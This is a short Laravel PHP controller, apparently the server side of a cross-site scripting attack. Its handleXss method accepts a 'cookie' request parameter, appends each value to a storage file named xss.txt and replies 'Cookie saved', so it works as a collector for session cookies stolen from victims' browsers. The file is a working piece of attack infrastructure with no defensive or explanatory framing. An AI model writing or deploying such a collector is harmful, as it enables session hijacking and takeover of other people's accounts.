<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class XssController extends Controller
{
    public function handleXss(Request $request)
   {
       $cookie = $request->get('cookie');
       $file = storage_path('xss.txt');
       file_put_contents($file, $cookie . PHP_EOL, FILE_APPEND);
       return response()->json(['status' => 'Cookie saved']);
   }
}
